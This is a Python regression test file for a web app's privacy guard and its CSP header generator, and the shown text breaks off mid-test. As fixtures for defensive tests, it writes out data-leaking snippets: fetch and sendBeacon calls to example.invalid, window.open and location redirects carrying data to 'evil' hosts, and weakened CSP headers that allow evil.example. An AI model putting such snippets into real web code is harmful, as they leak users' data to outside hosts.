#!/usr/bin/env python3
"""Regression tests for scripts/privacy_check.py and scripts/write_headers.py.

Each test builds a small fake dist/ and crates/web in a temporary directory,
shaped like a real `trunk build --release` (top-level glue with the
wasm-bindgen loader, an index.html with an inline loader, a wasm with a wbg
import section, _headers from write_headers.py), applies one bypass, and
checks the guard now fails. The bypasses come from both Judge reviews of
PR #18.

Run: python3 -B scripts/test_privacy_check.py   (CI runs it; no build needed)
"""

from __future__ import annotations

import contextlib
import io
import sys
import tempfile
import unittest
import unittest.mock
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))

import privacy_check  # noqa: E402
import write_headers  # noqa: E402

GLUE = """\
import { report } from './snippets/paste2prompt-web-f115d4a07fd7736c/telemetry.js';
export function __wbg_report_abc(arg0, arg1) { report(getStringFromWasm0(arg0, arg1)); }
async function __wbg_init(module_or_path) {
    if (typeof module_or_path === 'string') {
        module_or_path = fetch(module_or_path);
    }
    if (!module.ok) {
        throw new Error(`failed to fetch Wasm: ${module.status} ${module.statusText} fetching '${module.url}'`);
    }
}
"""

INDEX = """\
<!doctype html>
<html lang="en">
  <head>
    <link rel="stylesheet" href="/style-1.css" />
    <script type="module">
import init, * as bindings from '/paste2prompt-web-1.js';
const wasm = await init({ module_or_path: '/paste2prompt-web-1_bg.wasm' });
    </script>
  </head>
  <body>{BODY}</body>
</html>
"""

MAIN_RS = """\
//! Browser entry point.
use leptos::prelude::*;

fn main() {
    leptos::mount::mount_to_body(App);
}
"""

CARGO_TOML = """\
[package]
name = "paste2prompt-web"

[dependencies]
leptos.workspace = true
"""

def _uleb(n: int) -> bytes:
    out = bytearray()
    while True:
        b = n & 0x7F
        n >>= 7
        out.append(b | (0x80 if n else 0))
        if not n:
            return bytes(out)


def _name(s: str) -> bytes:
    return _uleb(len(s)) + s.encode()


def wasm_with_imports(names: list[str], module: str = "wbg", data: list[bytes] = ()) -> bytes:
    types = b"\x01\x60\x00\x00"  # one func type: () -> ()
    imports = _uleb(len(names)) + b"".join(_name(module) + _name(n) + b"\x00\x00" for n in names)
    out = (
        b"\0asm\x01\0\0\0"
        + b"\x01" + _uleb(len(types)) + types
        + b"\x02" + _uleb(len(imports)) + imports
    )
    if data:
        # Active segments in memory 0 at offset 1024 (i32.const 1024; end),
        # as rustc emits them, plus one passive segment of the last bytes.
        segs = [b"\x00\x41\x80\x08\x0b" + _uleb(len(d)) + d for d in data[:-1]]
        segs.append(b"\x01" + _uleb(len(data[-1])) + data[-1])
        body = _uleb(len(segs)) + b"".join(segs)
        out += b"\x0b" + _uleb(len(body)) + body
    return out


class Fixture:
    """A fake repo root with dist/ and crates/web, built like the real ones."""

    def __init__(self, root: Path) -> None:
        self.root = root
        self.dist = root / "dist"
        self.crate = root / "crates" / "web"
        self.dist.mkdir(parents=True)
        (self.crate / "src").mkdir(parents=True)
        self.write("dist/paste2prompt-web-1.js", GLUE)
        self.write("dist/style-1.css", "body { margin: 0; }\n")
        self.html()
        (self.dist / "paste2prompt-web-1_bg.wasm").write_bytes(
            wasm_with_imports(["__wbg_report_abc", "__wbindgen_throw"])
        )
        self.write("crates/web/src/main.rs", MAIN_RS)
        self.write("crates/web/Cargo.toml", CARGO_TOML)
        self.headers()

    def write(self, rel: str, text: str) -> Path:
        path = self.root / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text, encoding="utf-8")
        return path

    def html(self, body: str = "") -> None:
        self.write("dist/index.html", INDEX.replace("{BODY}", body))

    def headers(self) -> None:
        """Write _headers via write_headers.py, as the build does."""
        with contextlib.redirect_stdout(io.StringIO()):
            assert write_headers.main(["write_headers.py", str(self.dist)]) == 0

    def run(self) -> tuple[int, str]:
        out = io.StringIO()
        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(out):
            rc = privacy_check.main(["--dist", str(self.dist), "--web-crate", str(self.crate)])
        return rc, out.getvalue()


class GuardTest(unittest.TestCase):
    def setUp(self) -> None:
        self._tmp = tempfile.TemporaryDirectory()
        self.fx = Fixture(Path(self._tmp.name))

    def tearDown(self) -> None:
        self._tmp.cleanup()

    def assertPasses(self) -> None:
        rc, out = self.fx.run()
        self.assertEqual(rc, 0, out)

    def assertFails(self, *needles: str) -> str:
        rc, out = self.fx.run()
        self.assertEqual(rc, 1, f"guard passed but should have failed:\n{out}")
        for needle in needles:
            self.assertIn(needle, out)
        return out


class Baseline(GuardTest):
    def test_clean_fixture_passes(self):
        self.assertPasses()

    def test_permissions_policy_has_no_interest_cohort(self):
        text = (self.fx.dist / "_headers").read_text(encoding="utf-8")
        self.assertIn("Permissions-Policy:", text)
        self.assertNotIn("interest-cohort", text)


class Blocking1AllJs(GuardTest):
    """Judge finding 1: JS outside dist/*.js was never scanned."""

    TELEMETRY = (
        "export function report(data) {\n"
        '  fetch("https://example.invalid/collect", { method: "POST", body: data });\n'
        '  navigator.sendBeacon("https://example.invalid/b", data);\n'
        "}\n"
    )

    def test_snippet_js_is_scanned(self):
        # The Judge's reproduction: #[wasm_bindgen(module = "/telemetry.js")]
        # lands in dist/snippets/<crate>-<hash>/ behind an innocent shim name.
        self.fx.write("dist/snippets/paste2prompt-web-f115d4a07fd7736c/telemetry.js", self.TELEMETRY)
        self.assertFails("telemetry.js:2", "telemetry.js:3", "sendBeacon")

    def test_snippet_mjs_is_scanned(self):
        self.fx.write("dist/snippets/dep-1/inline0.mjs", "export const f = () => fetch('/x');\n")
        self.assertFails("inline0.mjs:1")

    def test_loader_allowlist_does_not_apply_to_snippets(self):
        self.fx.write("dist/snippets/dep-1/inline0.js", "module_or_path = fetch(module_or_path);\n")
        self.assertFails("inline0.js:1")

    def test_crate_js_source_is_scanned(self):
        self.fx.write("crates/web/telemetry.js", self.TELEMETRY)
        self.assertFails("crates/web/telemetry.js:2")

    def test_module_attr_outside_crate_is_scanned(self):
        self.fx.write("crates/shared/beacon.js", "navigator.sendBeacon('/b', d);\n")
        self.fx.write("crates/web/src/main.rs", MAIN_RS + (
            '#[wasm_bindgen(module = "../../shared/beacon.js")]\n'
            'extern "C" { fn ping(); }\n'
        ))
        self.assertFails("beacon.js:1")

    def test_missing_module_file_fails(self):
        self.fx.write("crates/web/src/main.rs", MAIN_RS + '#[wasm_bindgen(module = "/gone.js")]\n')
        self.assertFails("wasm_bindgen module file not found")

    def test_inline_js_raw_string_is_scanned(self):
        # sendBeacon is not a Rust-side pattern; only the inline_js scan sees it.
        self.fx.write("crates/web/src/main.rs", MAIN_RS + (
            '#[wasm_bindgen(inline_js = r#"\n'
            "export function report(d) { navigator.sendBeacon('/b', d); }\n"
            '"#)]\nextern "C" { fn report(d: &str); }\n'
        ))
        self.assertFails("in inline_js", "sendBeacon")

    def test_inline_js_plain_string_is_scanned(self):
        self.fx.write("crates/web/src/main.rs", MAIN_RS + (
            '#[wasm_bindgen(inline_js = "export function r(d) { new WebSocket(\\"wss://x\\"); }")]\n'
        ))
        self.assertFails("in inline_js", "WebSocket")

    def test_unknown_dist_file_type_fails_closed(self):
        self.fx.write("dist/worker.wasm.map", "{}")
        self.assertFails("file type the privacy guard does not scan")


class CspTemplateProperties(unittest.TestCase):
    """The per-directive allowlist, as a property of write_headers.py's template.

    Check 6 no longer interprets dist/_headers (it must equal the template), so
    these rules now guard the template itself: csp_problems runs on it in the
    guard, and here on weakened variants (the Judge's first-round bypasses).
    """

    H = "'sha256-" + "B" * 43 + "='"

    def policy(self, middle: str) -> str:
        return f"default-src 'none'; script-src 'self' 'wasm-unsafe-eval' {self.H}; {middle}"

    def assertProblems(self, policy: str, *needles: str) -> None:
        problems = "\n".join(privacy_check.csp_problems(policy))
        self.assertTrue(problems, f"no problem found in {policy!r}")
        for needle in needles:
            self.assertIn(needle, problems)

    def test_template_is_strict(self):
        policy = write_headers.template_policy().replace(write_headers.SCRIPT_HASHES, self.H)
        self.assertEqual(privacy_check.csp_problems(policy), [])

    def test_template_has_every_required_directive(self):
        directives, _ = privacy_check.parse_csp(write_headers.template_policy())
        for name, want in privacy_check.CSP_REQUIRED.items():
            with self.subTest(name=name):
                self.assertEqual(directives.get(name), want)

    def test_dropping_a_required_directive_is_a_problem(self):
        for name in ["form-action", "base-uri", "frame-ancestors", "connect-src", "default-src"]:
            with self.subTest(name=name):
                policy = "; ".join(d for d in write_headers.CSP_DIRECTIVES if not d.startswith(name))
                self.assertProblems(policy.replace(write_headers.SCRIPT_HASHES, self.H),
                                    f"CSP {name} must be exactly")

    def test_duplicate_directive(self):
        # Browsers enforce the first connect-src and script-src.
        self.assertProblems(
            "default-src 'none'; connect-src https://evil.example; "
            "script-src data: 'unsafe-inline'; "
            f"script-src 'self' 'wasm-unsafe-eval' {self.H}; connect-src 'self'; "
            "style-src 'self'; img-src 'self' blob: data:",
            "connect-src appears more than once", "script-src appears more than once",
            "https://evil.example", "'unsafe-inline'",
        )

    def test_duplicate_is_case_insensitive(self):
        self.assertProblems(self.policy("CONNECT-SRC https://evil.example; connect-src 'self'"),
                            "connect-src appears more than once", "https://evil.example")

    def test_uppercase_default_src_is_checked(self):
        self.assertProblems(f"DEFAULT-SRC *; script-src 'self' {self.H}", "CSP default-src allows *,")

    def test_blob_and_data_only_in_img_src(self):
        self.assertProblems(f"default-src 'none'; script-src 'self' data: blob: {self.H}",
                            "CSP script-src allows data:", "CSP script-src allows blob:")
        self.assertProblems(self.policy("connect-src 'self' blob:"), "CSP connect-src allows blob:")

    def test_hash_and_wasm_eval_only_in_script_src(self):
        self.assertProblems(self.policy(f"style-src 'self' {self.H} 'wasm-unsafe-eval'"),
                            "CSP style-src allows 'sha256-", "CSP style-src allows 'wasm-unsafe-eval'")

    def test_unsafe_keywords_wildcards_and_hosts(self):
        for directive, src in [
            ("script-src", "'unsafe-inline'"), ("script-src", "'unsafe-eval'"),
            ("script-src", "'strict-dynamic'"), ("style-src", "'unsafe-inline'"),
            ("img-src", "*"), ("img-src", "https:"), ("connect-src", "https://x.example"),
            ("worker-src", "blob:"), ("frame-src", "*"), ("object-src", "data:"),
        ]:
            with self.subTest(directive=directive, src=src):
                if directive == "script-src":
                    policy = f"default-src 'none'; script-src 'self' {src} {self.H}"
                else:
                    policy = self.policy(f"{directive} {src}")
                self.assertProblems(policy, f"CSP {directive} allows {src}")

    def test_reporting_directives(self):
        for d in ["report-uri /csp-report", "report-to default"]:
            with self.subTest(d=d):
                self.assertProblems(self.policy(d), "sends violation reports")

    def test_none_mixed_with_sources(self):
        self.assertProblems(self.policy("connect-src 'none' 'self'"), "mixes 'none'")

    def test_weakened_template_fails_the_guard(self):
        # An edit to the template in write_headers.py would make dist/_headers
        # "match"; the guard's own csp_problems run on the template catches it.
        weakened = tuple(d for d in write_headers.CSP_DIRECTIVES if not d.startswith("form-action"))
        with tempfile.TemporaryDirectory() as tmp, \
                unittest.mock.patch.object(write_headers, "CSP_DIRECTIVES", weakened):
            fx = Fixture(Path(tmp))
            rc, out = fx.run()
        self.assertEqual(rc, 1, out)
        self.assertIn("write_headers.py: template: CSP form-action must be exactly 'none'", out)


class TemplateStructure(unittest.TestCase):
    """Issue #32: the guard itself checks HEADERS_TEMPLATE's structure.

    Each test edits the template in write_headers.py, writes dist/_headers
    from the edited template (so the exact-match check passes), and runs the
    guard, as `wrangler deploy`'s build step does. Only the guard's own
    template check can fail it.
    """

    T = write_headers.HEADERS_TEMPLATE
    CSP_LINE = f"  Content-Security-Policy: {write_headers.template_policy()}\n"

    def run_guard(self, template: str) -> tuple[int, str]:
        with tempfile.TemporaryDirectory() as tmp, \
                unittest.mock.patch.object(write_headers, "HEADERS_TEMPLATE", template):
            fx = Fixture(Path(tmp))
            # The deployed file matches the edited template, so only the
            # template check can catch the edit.
            self.assertEqual((fx.dist / "_headers").read_text(encoding="utf-8"),
                             write_headers.expected_headers(fx.dist))
            return fx.run()

    def assertTemplateFails(self, template: str, *needles: str) -> None:
        rc, out = self.run_guard(template)
        self.assertEqual(rc, 1, f"guard passed an edited template:\n{out}")
        self.assertIn("write_headers.py: HEADERS_TEMPLATE:", out)
        for needle in needles:
            self.assertIn(needle, out)

    def test_real_template_has_no_problems(self):
        self.assertEqual(privacy_check.template_problems(self.T), [])
        self.assertIn(self.CSP_LINE, self.T)

    def test_index_html_csp_removal_fails(self):
        # The issue's reproduction.
        self.assertTemplateFails(self.T + "/index.html\n  ! Content-Security-Policy\n",
                                 "path block '/index.html'", "header-removal line",
                                 "exactly one path block (/*), found 2")

    def test_removal_line_in_star_block_fails(self):
        self.assertTemplateFails(self.T + "  ! X-Content-Type-Options\n", "header-removal line")

    def test_star_block_renamed_fails(self):
        self.assertTemplateFails(self.T.replace("/*\n", "/index.html\n"),
                                 "path block '/index.html'; the only block must be /*")

    def test_other_path_block_fails(self):
        for extra in ["/assets/*\n  Cache-Control: no-store\n",
                      "https://paste2prompt.example/*\n  X-Robots-Tag: noindex\n"]:
            with self.subTest(extra=extra):
                self.assertTemplateFails(self.T + extra, "the only block must be /*")

    def test_report_only_added_fails(self):
        self.assertTemplateFails(
            self.T + "  Content-Security-Policy-Report-Only: default-src 'none'\n",
            "Report-Only")

    def test_csp_turned_into_report_only_fails(self):
        self.assertTemplateFails(
            self.T.replace("Content-Security-Policy:", "Content-Security-Policy-Report-Only:"),
            "Report-Only", "Content-Security-Policy exactly once, found 0")

    def test_second_csp_line_fails(self):
        self.assertTemplateFails(self.T + "  content-security-policy: default-src *\n",
                                 "set more than once", "exactly once, found 2")

    def test_csp_line_not_from_directives_fails(self):
        # csp_problems checks CSP_DIRECTIVES, so a hand-edited line must equal it.
        edited = self.T.replace("form-action 'none'", "form-action 'self'")
        self.assertNotEqual(edited, self.T)
        self.assertTemplateFails(edited, "is not '; '.join(CSP_DIRECTIVES)")

    def test_header_before_block_fails(self):
        self.assertTemplateFails("  Access-Control-Allow-Origin: *\n" + self.T,
                                 "header line before the /* block")

    def test_malformed_header_line_fails(self):
        for bad in ["  index.html\n", "  X Foo: bar\n", "  X\tFoo: bar\n", "  : bar\n"]:
            with self.subTest(bad=bad):
                self.assertTemplateFails(self.T + bad, "not a 'Name: value' header")

    # Cloudflare's parser (workers-sdk parseHeaders.ts) trims each line, then
    # calls it a path if it matches /^([^\s]+:\/\/|\/)/, whatever its
    # indentation. These are the Judge's PR #40 repros: each one moves every
    # header off /* in the deployed file.
    def test_indented_url_line_opens_a_block(self):
        self.assertTemplateFails(self.T.replace("/*\n", "/*\n  https://nomatch.example/*\n"),
                                 "path block 'https://nomatch.example/*'",
                                 "indented path line", "exactly one path block (/*), found 2")

    def test_indented_slash_line_with_colon_opens_a_block(self):
        self.assertTemplateFails(self.T.replace("/*\n", "/*\n  /nomatch:x\n"),
                                 "path block '/nomatch:x'", "indented path line",
                                 "exactly one path block (/*), found 2")

    def test_indented_path_is_a_path_whatever_the_whitespace(self):
        for ws in ["\t", " ", "\u00a0", "\ufeff", "\u3000"]:
            with self.subTest(ws=repr(ws)):
                self.assertTemplateFails(self.T.replace("/*\n", f"/*\n{ws}/x\n"),
                                         "path block '/x'", "found 2")

    def test_indented_star_block_is_flagged(self):
        self.assertTemplateFails(self.T.replace("/*\n", "  /*\n"), "indented path line '/*'")

    def test_unindented_header_fails(self):
        self.assertTemplateFails(self.T + "X-Frame-Options: DENY\n", "unindented header line")

    def test_removal_without_space_fails(self):
        self.assertTemplateFails(self.T + "  !Content-Security-Policy\n", "header-removal line")

    def test_empty_header_value_fails(self):
        for bad in ["  X-Foo:\n", "  X-Foo:   \n"]:
            with self.subTest(bad=bad):
                self.assertTemplateFails(self.T + bad, "x-foo has an empty value")

    def test_indented_comment_is_a_comment(self):
        rc, out = self.run_guard(self.T.replace("/*\n", "/*\n  # /nomatch:x\n"))
        self.assertEqual(rc, 0, out)

    def test_value_with_line_separator_is_one_line(self):
        # Cloudflare splits on "\n" only, so U+2028 stays inside the header
        # value. Reading it with str.splitlines() would see a second line.
        problems = privacy_check.template_problems(
            self.T.replace("nosniff\n", "nosniff\u2028/x\n"))
        self.assertNotIn("path block", "\n".join(problems))

    def test_line_over_2000_fails(self):
        long_value = "x" * 2001
        self.assertTemplateFails(self.T + f"  X-Long: {long_value}\n",
                                 "characters; Cloudflare ignores lines over 2000")
        self.assertTemplateFails(self.T + f"# {long_value}\n", "Cloudflare ignores lines over 2000")

    def test_real_lines_are_under_the_limit(self):
        rendered = write_headers.render_headers(["'sha256-" + "A" * 43 + "='"] * 4)
        longest = max(privacy_check.cf_line_length(line) for line in rendered.split("\n"))
        self.assertLess(longest, privacy_check.CF_MAX_LINE_LENGTH)

    def test_repeated_header_fails(self):
        self.assertTemplateFails(self.T + "  X-Content-Type-Options: nosniff\n",
                                 "x-content-type-options set more than once")

    def test_placeholder_count(self):
        # render_headers refuses this before the guard runs; check it directly.
        problems = privacy_check.template_problems(
            self.T + f"# {write_headers.SCRIPT_HASHES}\n")
        self.assertIn("placeholder once, found 2", "\n".join(problems))
        problems = privacy_check.template_problems(self.T.replace(write_headers.SCRIPT_HASHES, ""))
        self.assertIn("placeholder once, found 0", "\n".join(problems))

    def test_comments_and_blank_lines_are_allowed(self):
        rc, out = self.run_guard("# a comment\n\n" + self.T + "\n# trailing\n")
        self.assertEqual(rc, 0, out)


class HeadersExact(GuardTest):
    """Judge round 2, finding 1: _headers must be exactly write_headers.py's output."""

    def edit_headers(self, fn) -> None:
        path = self.fx.dist / "_headers"
        path.write_text(fn(path.read_text(encoding="utf-8")), encoding="utf-8")

    def test_generated_file_passes(self):
        self.assertPasses()

    def test_crlf_line_endings_pass(self):
        path = self.fx.dist / "_headers"
        path.write_bytes(path.read_bytes().replace(b"\n", b"\r\n"))
        self.assertPasses()

    def test_rendered_csp_line_over_2000_fails(self):
        # Each inline script adds a ~54-character hash to the rendered CSP
        # line, which the template check cannot see.
        self.fx.html("".join(f"<script>var a{i} = {i};</script>" for i in range(40)))
        self.fx.headers()
        self.assertFails("_headers: line 5:", "characters; Cloudflare ignores lines over 2000")

    def test_csp_moved_to_another_path_fails(self):
        self.edit_headers(lambda t: t.replace("/*\n", "/__unused__\n"))
        self.assertFails("differs from scripts/write_headers.py's output", "+/__unused__")

    def test_header_removal_for_root_fails(self):
        self.edit_headers(lambda t: t + "/\n  ! Content-Security-Policy\n")
        self.assertFails("differs", "! Content-Security-Policy")

    def test_header_removal_for_index_html_fails(self):
        self.edit_headers(lambda t: t + "/index.html\n  ! Content-Security-Policy\n")
        self.assertFails("differs", "+/index.html")

    def test_form_action_dropped_fails(self):
        self.edit_headers(lambda t: t.replace("; form-action 'none'", ""))
        self.assertFails("differs", "-  Content-Security-Policy")

    def test_base_uri_dropped_fails(self):
        self.edit_headers(lambda t: t.replace("; base-uri 'none'", ""))
        self.assertFails("differs", "-  Content-Security-Policy")

    def test_report_only_header_fails(self):
        self.edit_headers(lambda t: t + "  Content-Security-Policy-Report-Only: default-src 'none'; "
                                        "report-uri https://evil.example/r\n")
        self.assertFails("differs", "+  Content-Security-Policy-Report-Only")

    def test_extra_header_or_block_fails(self):
        for extra in ["  Access-Control-Allow-Origin: *\n", "/assets/*\n  Cache-Control: no-store\n"]:
            with self.subTest(extra=extra):
                self.fx.headers()
                self.edit_headers(lambda t: t + extra)
                self.assertFails("differs")

    def test_stale_hash_fails(self):
        # index.html changed after _headers was written: the loader would be blocked.
        self.fx.write("dist/index.html", (self.fx.dist / "index.html").read_text().replace(
            "const wasm", "const  wasm"))
        self.assertFails("differs", "'sha256-")

    def test_missing_headers_fails(self):
        (self.fx.dist / "_headers").unlink()
        self.assertFails("_headers: missing")

    def test_headers_in_subdirectory_is_unknown(self):
        self.fx.write("dist/snippets/x/_headers", "/*\n  ! Content-Security-Policy\n")
        self.assertFails("file type the privacy guard does not scan")


class RenderedStructure(unittest.TestCase):
    """Issue #45: the structural check also runs on the rendered file.

    Each test patches write_headers.py's render path (render_headers or
    expected_headers) to add lines outside HEADERS_TEMPLATE. The build then
    writes those lines to dist/_headers, and the guard's expected value moves
    with them, so the exact-match check passes. The template is untouched, so
    template_problems passes too. Only the check on the rendered text can
    fail the guard.
    """

    EXTRAS = {
        "second path block": ("/index.html\n  X-Frame-Options: DENY\n",
                              "path block '/index.html'"),
        "removal line": ("  ! Content-Security-Policy\n",
                         "header-removal line '! Content-Security-Policy'"),
        "removal block": ("/index.html\n  ! Content-Security-Policy\n",
                          "header-removal line '! Content-Security-Policy'"),
        "report-only header": ("  Content-Security-Policy-Report-Only: default-src 'none'\n",
                               "has a Report-Only policy"),
    }

    def run_guard(self, target: str, extra: str) -> tuple[int, str]:
        original = getattr(write_headers, target)
        with tempfile.TemporaryDirectory() as tmp, \
                unittest.mock.patch.object(write_headers, target,
                                           lambda arg: original(arg) + extra):
            fx = Fixture(Path(tmp))
            text = (fx.dist / "_headers").read_text(encoding="utf-8")
            self.assertTrue(text.endswith(extra))
            # The deployed file equals the guard's expected value, and the
            # template still passes its own check.
            self.assertEqual(text, write_headers.expected_headers(fx.dist))
            self.assertEqual(privacy_check.template_problems(write_headers.HEADERS_TEMPLATE), [])
            return fx.run()

    def test_patched_render_path_fails(self):
        for target in ("render_headers", "expected_headers"):
            for label, (extra, needle) in self.EXTRAS.items():
                with self.subTest(target=target, extra=label):
                    rc, out = self.run_guard(target, extra)
                    self.assertEqual(rc, 1, f"guard passed a patched {target}:\n{out}")
                    self.assertNotIn("differs", out)
                    self.assertNotIn("HEADERS_TEMPLATE:", out)
                    # Both the render output and the deployed bytes are checked.
                    lines = [line for line in out.splitlines() if needle in line]
                    self.assertEqual(len(lines), 2, out)
                    self.assertIn("write_headers.py: render_headers() output: ", lines[0])
                    self.assertIn("/dist/_headers: ", lines[1])

    def test_unpatched_render_has_no_problems(self):
        rendered = write_headers.render_headers(["'sha256-" + "A" * 43 + "='"] * 2)
        self.assertEqual(privacy_check.rendered_problems(rendered), [])

    def test_rendered_csp_must_be_the_template_with_hashes(self):
        good = write_headers.render_headers(["'sha256-" + "A" * 43 + "='"])
        for label, edit in {
            "placeholder left in": lambda t: t.replace("'sha256-" + "A" * 43 + "='",
                                                       write_headers.SCRIPT_HASHES),
            "no hash": lambda t: t.replace(" 'sha256-" + "A" * 43 + "='", ""),
            "host instead of hash": lambda t: t.replace("'sha256-" + "A" * 43 + "='",
                                                        "https://cdn.example"),
            "directive appended": lambda t: t.replace("frame-ancestors 'none'",
                                                      "frame-ancestors 'none'; img-src *"),
        }.items():
            with self.subTest(edit=label):
                problems = privacy_check.rendered_problems(edit(good))
                self.assertTrue(any("Content-Security-Policy line is not" in p
                                    or "placeholder" in p for p in problems), problems)


class FileTypesAnyCase(GuardTest):
    """Judge round 2, finding 2: every file-type decision is case-insensitive."""

    def test_uppercase_js_is_scanned(self):
        self.fx.write("dist/snippets/dep-0123/x.JS", "fetch('https://evil/' + d);\n")
        self.assertFails("x.JS:1", "network or navigation API in JS")

    def test_uppercase_mjs_is_scanned(self):
        self.fx.write("dist/extra.MJS", "fetch('https://evil/' + d);\n")
        self.assertFails("extra.MJS:1")

    def test_top_level_uppercase_html_is_scanned(self):
        self.fx.write("dist/other.HTML", '<script src="https://evil.example/x.js"></script>\n')
        self.assertFails("other.HTML", "reference to another origin")

    def test_nested_html_any_case_fails(self):
        self.fx.write("dist/snippets/x/page.Html", "<p>hi</p>\n")
        self.assertFails("HTML outside the dist root is not allowed")

    def test_nested_wasm_with_network_import_fails(self):
        path = self.fx.dist / "snippets" / "dep-0123" / "helper.wasm"
        path.parent.mkdir(parents=True)
        path.write_bytes(wasm_with_imports(["__wbg_fetch_1b2c"]))
        self.assertFails("helper.wasm", "network or navigation API import: wbg.__wbg_fetch_1b2c")

    def test_uppercase_wasm_is_import_checked(self):
        (self.fx.dist / "extra.WASM").write_bytes(wasm_with_imports(["x"], module="env"))
        self.assertFails("extra.WASM", "import from unexpected module 'env'")

    def test_unparseable_wasm_fails(self):
        (self.fx.dist / "snippets").mkdir()
        (self.fx.dist / "snippets" / "junk.wasm").write_bytes(b"\0asm\x01\0\0\0\x02\x05\x01")
        self.assertFails("junk.wasm", "cannot parse wasm import section")

    def test_uppercase_css_is_scanned(self):
        self.fx.write("dist/extra.CSS", "a { background: url(https://x.example/a.png); }\n")
        self.assertFails("extra.CSS", "CSS reference to another origin")

    def test_svg_and_htm_fail_closed(self):
        for name in ["dist/logo.svg", "dist/page.htm"]:
            with self.subTest(name=name):
                self.fx.write(name, "<svg/>")
                self.assertFails("file type the privacy guard does not scan")

    def test_uppercase_crate_js_is_scanned(self):
        self.fx.write("crates/web/helper.JS", "navigator.sendBeacon('/b', d);\n")
        self.assertFails("helper.JS:1")


class LoaderAllowanceGlueOnly(GuardTest):
    """The loader lines are allowed only in the glue that index.html imports."""

    def test_second_top_level_js_gets_no_allowance(self):
        self.fx.write("dist/helper.js", "module_or_path = fetch(module_or_path);\n")
        self.assertFails("helper.js:1")

    def test_glue_must_be_the_imported_file(self):
        # If index.html imports another name, the real glue's loader lines are findings.
        self.fx.write("dist/index.html", (self.fx.dist / "index.html").read_text().replace(
            "/paste2prompt-web-1.js", "/other.js"))
        self.fx.write("dist/other.js", "export default function init() {}\n")
        self.fx.headers()
        self.assertFails("paste2prompt-web-1.js:5", "paste2prompt-web-1.js:8")

    def test_loader_without_import_fails(self):
        self.fx.write("dist/index.html", (self.fx.dist / "index.html").read_text().replace(
            "import init, * as bindings from '/paste2prompt-web-1.js';", ""))
        self.fx.headers()
        self.assertFails("import exactly one glue .js, found 0")

    def test_loader_importing_nested_or_remote_fails(self):
        for spec in ["/snippets/x/a.js", "https://evil.example/a.js"]:
            with self.subTest(spec=spec):
                self.fx.write("dist/index.html", (self.fx.dist / "index.html").read_text().replace(
                    "'/paste2prompt-web-1.js'", f"'{spec}'"))
                self.fx.headers()
                self.assertFails("not a top-level .js")
                self.fx.html()
                self.fx.headers()


class NonBlocking(GuardTest):
    def test_wrong_web_crate_path_fails(self):
        (self.fx.crate / "src" / "main.rs").unlink()
        self.assertFails("no .rs files")

    def test_double_slash_in_string_does_not_hide_fetch(self):
        # Comments are no longer stripped, so `//` in a URL can't end the line.
        self.fx.write("crates/web/src/main.rs", MAIN_RS + 'fn f() { let u = "https://x"; fetch(u); }\n')
        self.assertFails("main.rs:7", "fetch")

    def test_navigation_in_js_fails(self):
        for line in [
            "window.open('https://x?d=' + d);",
            "location = 'https://x?d=' + d;",
            "location.href = 'https://x?d=' + d;",
            "window.location.href='https://x';",
            "location.assign(u);",
            "document.location.replace(u);",
        ]:
            with self.subTest(line=line):
                self.fx.write("dist/snippets/nav/n.js", line + "\n")
                self.assertFails("n.js:1")

    def test_more_navigation_forms_fail(self):
        # Judge round 2: forms the first navigation patterns missed.
        for line in [
            "open('https://evil/?d=' + d);",
            "const w = open ('https://evil/');",
            "location.host = 'evil.example';",
            "location.hostname = 'evil.example';",
            "location.search = '?d=' + d;",
            "location['href'] = 'https://evil/';",
            'window.location["assign"](u);',
        ]:
            with self.subTest(line=line):
                self.fx.write("dist/snippets/nav/n.js", line + "\n")
                self.assertFails("n.js:1")

    def test_open_method_names_are_not_bare_open(self):
        self.fx.write("dist/snippets/nav/n.js", "indexedDB.open('db'); const reopen = 1; x.isopen(1);\n")
        self.assertPasses()

    def test_meta_refresh_fails(self):
        for meta in ['<meta http-equiv="refresh" content="0;url=https://evil.example/">',
                     '<meta HTTP-EQUIV=" Refresh " content="5">']:
            with self.subTest(meta=meta):
                self.fx.html(meta)
                self.fx.headers()
                self.assertFails("<meta http-equiv='refresh'> navigates away")

    def test_location_comparison_is_not_navigation(self):
        self.fx.write("dist/snippets/nav/n.js", "if (location == x) {}\n")
        self.assertPasses()

    def test_navigation_wasm_imports_fail(self):
        for name in ["__wbg_open_1a2b", "__wbg_location_9f", "__wbg_assign_3c",
                     "__wbg_replace_77", "__wbg_openwithurl_00"]:
            with self.subTest(name=name):
                (self.fx.dist / "paste2prompt-web-1_bg.wasm").write_bytes(wasm_with_imports([name]))
                self.assertFails("network or navigation API import")

    def test_navigation_in_rust_fails(self):
        self.fx.write("crates/web/src/main.rs", MAIN_RS + (
            "fn f(w: web_sys::Window) {\n    w.open_with_url(\"https://x\");\n    w.location();\n}\n"
        ))
        self.assertFails("open_with_url", ".location()")

    def test_html_url_attributes(self):
        for body in [
            '<img srcset="/a.png 1x, https://x.example/b.png 2x">',
            '<video poster="https://x.example/p.png"></video>',
            '<form action="https://x.example/collect"></form>',
            '<button formaction="//x.example/c">',
            '<a href="/" ping="https://x.example/p">',
            '<img src="  https://x.example/a.png">',
            '<img src="http:x.example/a.png">',
        ]:
            with self.subTest(body=body):
                self.fx.html(body)
                self.fx.headers()
                self.assertFails("reference to another origin")

    def test_html_local_urls_pass(self):
        self.fx.html('<img src="/a.png" srcset="/a.png 1x, b.png 2x"><img src="data:image/png;base64,AA==">')
        self.fx.headers()
        self.assertPasses()

    def test_css_url_and_import(self):
        for css in [
            "body { background: url(https://x.example/a.png); }",
            "body { background: url('//x.example/a.png'); }",
            '@import "https://x.example/a.css";',
        ]:
            with self.subTest(css=css):
                self.fx.write("dist/style-1.css", css + "\n")
                self.assertFails("CSS reference to another origin")

    def test_css_local_url_passes(self):
        self.fx.write("dist/style-1.css", "a { background: url(/i.png); } b { mask: url(data:image/svg+xml,x); }\n")
        self.assertPasses()


class NavigationResiduals(GuardTest):
    """#33: a runtime meta refresh, and an external href literal plus click()."""

    WASM = "paste2prompt-web-1_bg.wasm"

    def rust(self, code: str) -> None:
        self.fx.write("crates/web/src/main.rs", MAIN_RS + code)

    def wasm(self, *data: bytes, names: tuple[str, ...] = ("__wbindgen_throw",)) -> None:
        (self.fx.dist / self.WASM).write_bytes(wasm_with_imports(list(names), data=list(data)))

    # Runtime <meta http-equiv="refresh">

    def test_runtime_meta_refresh_in_js_fails(self):
        for line in [
